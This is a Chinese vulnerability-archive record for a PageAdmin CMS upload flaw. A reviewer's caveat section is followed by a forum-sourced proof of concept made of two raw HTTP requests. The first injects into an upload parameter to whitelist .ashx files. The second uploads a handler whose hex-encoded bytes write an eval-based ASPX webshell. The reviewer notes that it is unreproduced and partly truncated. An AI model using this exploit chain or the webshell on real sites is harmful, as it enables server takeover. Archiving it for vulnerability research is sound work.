---
source: "hatch 补库批 20260928"
product: "PageAdmin CMS（误称PageMyAdmin）"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PageMyAdmin文件上传getshell"
prerequisites: "来源所述条件，未列明部分仍待核：upload.aspx接受字段表达式修改pa_field id174；相应上传会话权限未解释；IIS处理ashx/aspx及目录可写"
side_effects: "未执行；本文需注意的操作影响：第一步返回cs_error仍宣称增加白名单，缺DB前后证据；需解释副作用发生早于报错；第二上传后还须访问返回的.ashx才由Handler写file.aspx，正文发送第二步返回shell省略触发；Referer截断含...，版本/来源只有论坛；白名单永久加入ashx及写第二文件副作用应明确"
source_status: "unknown"
id: "vw-2543d8968349da3ee993e2d5"
entity_id: "ve-2543d8968349da3ee993e2d5"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：upload.aspx接受字段表达式修改pa_field id174；相应上传会话权限未解释；IIS处理ashx/aspx及目录可写

- **适用与权限边界（1）**：产品路径/表名都指PageAdmin，与标题目录PageMyAdmin错名一致。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（2）**：第一步返回cs_error仍宣称增加白名单，缺DB前后证据；需解释副作用发生早于报错。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **结论使用边界（3）**：第二上传后还须访问返回的.ashx才由Handler写file.aspx，正文发送第二步返回shell省略触发。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **代码与转录边界（4）**：Referer截断含...，版本/来源只有论坛；白名单永久加入ashx及写第二文件副作用应明确。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PageMyAdmin文件上传getshell

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

先set增加ashx白名单-\>

    POST /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1
    Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36
    Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55
    Referer: http://www.0-sec.org/e/aspx/upload.aspx?a=pageadmin_cms
    Host: www.0-sec.org
    Content-Length: 106
    Connection: Keep-Alive

    submit=1&swf_upload=2&table=pa_field&field=file_ext=".jpg,.jpeg,.gif,.bmp,.ashx"  where id=174 and max_num

返回包

    HTTP/1.1 200 OK
    Cache-Control: private
    Content-Length: 72
    Content-Type: text/html; charset=utf-8
    Server: Microsoft-IIS/7.5
    X-AspNet-Version: 2.0.50727
    Date: Sat, 13 Jul 2019 07:52:02 GMT

    <script type='text/javascript'>location.href='?result=cs_error'</script>

第二步 在上传ashx-\>

    POST /e/aspx/upload.aspx HTTP/1.1
    Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzBItOAbA8GrZ7s49
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36
    Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55
    Referer: http://www.0-sec.org/e/aspx/upload_p ... pic&from=master
    Host: www.0-sec.org
    Content-Length: 2318


    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="file"; filename="005.ashx"
    Content-Type: image/jpeg

    <%@ WebHandler Language="C#" Class="Handler" %>
    using System;
    using System.Web;
    using System.IO;


    public class Handler : IHttpHandler
    {
        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
        public void ProcessRequest(HttpContext context)
        {
            byte[] b={0x3C, 0x25, 0x40, 0x20, 0x50, 0x61, 0x67, 0x65, 0x20, 0x4C, 0x61, 0x6E, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3D, 0x22, 0x4A, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x22, 0x25, 0x3E, 0x3C, 0x25, 0x65, 0x76, 0x61, 0x6C, 0x28, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x2E, 0x49, 0x74, 0x65, 0x6D, 0x5B, 0x22, 0x70, 0x61, 0x73, 0x73, 0x22, 0x5D, 0x2C, 0x22, 0x75, 0x6E, 0x73, 0x61, 0x66, 0x65, 0x22, 0x29, 0x3B, 0x25, 0x3E};
            try
            {
                File.WriteAllBytes(context.Server.MapPath("/e/upload/s1/article/file/")+"/file.aspx",b);
                context.Response.Write("oooooooookkkkkkkkk");
            }
            catch(Exception ex)
            {
                context.Response.Write(ex.Message);
            }
            context.Response.End();
        }
    }
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="width"

    400
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="height"

    400
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="url"


    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="filesize"

    0
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="username"

    admin
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="sid"

    1
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="type"

    file
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="table"

    article
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="field"

    titlepic
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="from"

    master
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="submit"

    1
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49--

发送第二步返回shell

参考链接
--------

> <https://www.t00ls.net/viewthread.php?tid=52096&highlight=PageMyadmin>
